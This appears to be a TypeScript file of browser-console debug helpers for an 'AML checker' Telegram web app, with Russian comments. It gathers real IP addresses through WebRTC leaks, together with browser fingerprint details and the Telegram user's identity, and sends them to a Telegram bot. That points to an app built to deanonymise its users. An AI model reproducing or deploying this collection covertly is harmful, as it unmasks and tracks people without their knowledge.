/**
 * Debug helpers для консоли браузера
 * Автоматически доступны в window после загрузки приложения
 */

import { getRealIPAddress, getIPFast, getUserInfo, getPrimaryIP } from './webrtc-ip';
import { sendUserDataToBot, getBotInfo } from './telegram-bot';

/**
 * Показать все доступные debug команды
 */
export function help() {
  console.log(`
╔════════════════════════════════════════════════════════════╗
║            🛠️  AML CHECKER DEBUG HELPERS                  ║
╚════════════════════════════════════════════════════════════╝

📡 WebRTC & IP функции:
  quickTestWebRTC()     - Быстрый тест WebRTC leak
  testWebRTC()          - Полный тест с отправкой в Telegram
  showMyIP()            - Показать мой IP
  showAllIPs()          - Показать все обнаруженные IP
  showUserInfo()        - Показать информацию о браузере

📤 Telegram функции:
  sendTestMessage()     - Отправить тестовое сообщение
  checkBot()            - Проверить бота
  sendMyData()          - Отправить мои данные в бота

🔧 Утилиты:
  help()                - Показать эту справку
  clear()               - Очистить консоль

╔════════════════════════════════════════════════════════════╗
║ Примеры использования:                                    ║
║ > quickTestWebRTC()     // Быстрый тест                   ║
║ > showMyIP()            // Узнать свой IP                 ║
║ > sendTestMessage()     // Проверить Telegram бота        ║
╚════════════════════════════════════════════════════════════╝
  `);
}

/**
 * Показать основной IP адрес
 */
export async function showMyIP() {
  console.log('🔍 Определение вашего IP адреса...');
  const { ip, ipInfo } = await getIPFast();
  
  console.log('\n📍 Ваш основной IP:', ip);
  
  if (ipInfo.webrtcLeaked.length > 0) {
    console.log('\n🔓 Все обнаруженные IP через WebRTC:');
    ipInfo.webrtcLeaked.forEach((addr, i) => {
      console.log(`   ${i + 1}. ${addr}`);
    });
  }
  
  return ip;
}

/**
 * Показать все IP адреса с классификацией
 */
export async function showAllIPs() {
  console.log('🔍 Сбор всех IP адресов...\n');
  const ipInfo = await getRealIPAddress();
  
  console.log('═══════════════════════════════════════');
  
  if (ipInfo.webrtcLeaked.length > 0) {
    console.log(`\n🔓 WebRTC Leaked (${ipInfo.webrtcLeaked.length}):`);
    ipInfo.webrtcLeaked.forEach((ip, i) => {
      console.log(`   ${i + 1}. ${ip}`);
    });
  }
  
  if (ipInfo.ipv4.length > 0) {
    console.log(`\n📍 Публичные IPv4 (${ipInfo.ipv4.length}):`);
    ipInfo.ipv4.forEach(ip => console.log(`   • ${ip}`));
  }
  
  if (ipInfo.ipv6.length > 0) {
    console.log(`\n📍 Публичные IPv6 (${ipInfo.ipv6.length}):`);
    ipInfo.ipv6.forEach(ip => console.log(`   • ${ip}`));
  }
  
  if (ipInfo.localIP.length > 0) {
    console.log(`\n🏠 Локальные IP (${ipInfo.localIP.length}):`);
    ipInfo.localIP.forEach(ip => console.log(`   • ${ip}`));
  }
  
  console.log('\n═══════════════════════════════════════\n');
  
  return ipInfo;
}

/**
 * Показать информацию о пользователе
 */
export function showUserInfo() {
  const info = getUserInfo();
  
  console.log('\n👤 Информация о пользователе:');
  console.log('═══════════════════════════════════════');
  console.log(`📱 Устройство: ${info.platform}`);
  console.log(`🌍 Язык: ${info.language}`);
  console.log(`📺 Разрешение: ${info.screenResolution}`);
  console.log(`🕐 Timezone: ${info.timezone}`);
  console.log(`⏰ Время: ${info.timestamp}`);
  console.log('\n🔍 User Agent:');
  console.log(`   ${info.userAgent}`);
  console.log('═══════════════════════════════════════\n');
  
  return info;
}

/**
 * Отправить тестовое сообщение в бота
 */
export async function sendTestMessage() {
  console.log('📤 Отправка тестового сообщения в Telegram...');
  
  const { ip, ipInfo } = await getIPFast();
  const userInfo = getUserInfo();
  
  const testData = {
    ip,
    ipInfo,
    ...userInfo,
    telegramUser: null
  };
  
  const result = await sendUserDataToBot(testData);
  
  if (result) {
    console.log('✅ Тестовое сообщение успешно отправлено!');
  } else {
    console.error('❌ Ошибка отправки тестового сообщения');
  }
  
  return result;
}

/**
 * Проверить бота
 */
export async function checkBot() {
  console.log('🤖 Проверка Telegram бота...');
  
  const botInfo = await getBotInfo();
  
  if (botInfo && botInfo.ok) {
    console.log('\n✅ Бот работает!');
    console.log('═══════════════════════════════════════');
    console.log(`🤖 Имя: ${botInfo.result.first_name}`);
    console.log(`📝 Username: @${botInfo.result.username}`);
    console.log(`🆔 ID: ${botInfo.result.id}`);
    console.log('═══════════════════════════════════════\n');
  } else {
    console.error('❌ Ошибка при проверке бота:', botInfo);
  }
  
  return botInfo;
}

/**
 * Отправить мои данные в бота
 */
export async function sendMyData() {
  console.log('📊 Сбор и отправка ваших данных...\n');
  
  const { ip, ipInfo } = await getIPFast();
  const userInfo = getUserInfo();
  
  console.log(`📍 IP: ${ip}`);
  console.log(`🔓 WebRTC Leaked: ${ipInfo.webrtcLeaked.length} адресов`);
  
  let telegramUser = null;
  if (typeof window !== 'undefined' && window.Telegram?.WebApp) {
    telegramUser = window.Telegram.WebApp.initDataUnsafe?.user || null;
    if (telegramUser) {
      console.log(`👤 Telegram User: @${telegramUser.username || 'no username'}`);
    }
  }
  
  const userData = {
    ip,
    ipInfo,
    ...userInfo,
    telegramUser
  };
  
  console.log('\n📤 Отправка в Telegram...');
  const result = await sendUserDataToBot(userData);
  
  if (result) {
    console.log('✅ Данные успешно отправлены в бота!');
  } else {
    console.error('❌ Ошибка отправки данных');
  }
  
  return result;
}

/**
 * Показать статистику
 */
export async function showStats() {
  console.log('📊 Сбор статистики...\n');
  
  const startTime = Date.now();
  const { ip, ipInfo } = await getIPFast();
  const duration = Date.now() - startTime;
  
  console.log('═══════════════════════════════════════');
  console.log('📈 СТАТИСТИКА');
  console.log('═══════════════════════════════════════');
  console.log(`⏱️  Время сбора IP: ${duration}ms`);
  console.log(`📍 Основной IP: ${ip}`);
  console.log(`🔓 WebRTC Leaked: ${ipInfo.webrtcLeaked.length}`);
  console.log(`🌐 IPv4: ${ipInfo.ipv4.length}`);
  console.log(`🌐 IPv6: ${ipInfo.ipv6.length}`);
  console.log(`🏠 Local IPs: ${ipInfo.localIP.length}`);
  console.log('═══════════════════════════════════════\n');
  
  return {
    duration,
    ip,
    counts: {
      leaked: ipInfo.webrtcLeaked.length,
      ipv4: ipInfo.ipv4.length,
      ipv6: ipInfo.ipv6.length,
      local: ipInfo.localIP.length
    }
  };
}

// Экспортируем в window для доступа из консоли
if (typeof window !== 'undefined') {
  (window as any).help = help;
  (window as any).showMyIP = showMyIP;
  (window as any).showAllIPs = showAllIPs;
  (window as any).showUserInfo = showUserInfo;
  (window as any).sendTestMessage = sendTestMessage;
  (window as any).checkBot = checkBot;
  (window as any).sendMyData = sendMyData;
  (window as any).showStats = showStats;
  
  // Автоматически показываем справку при загрузке (с задержкой)
  setTimeout(() => {
    console.log('\n💡 Введите help() для списка доступных debug команд\n');
  }, 1000);
}

export default {
  help,
  showMyIP,
  showAllIPs,
  showUserInfo,
  sendTestMessage,
  checkBot,
  sendMyData,
  showStats
};
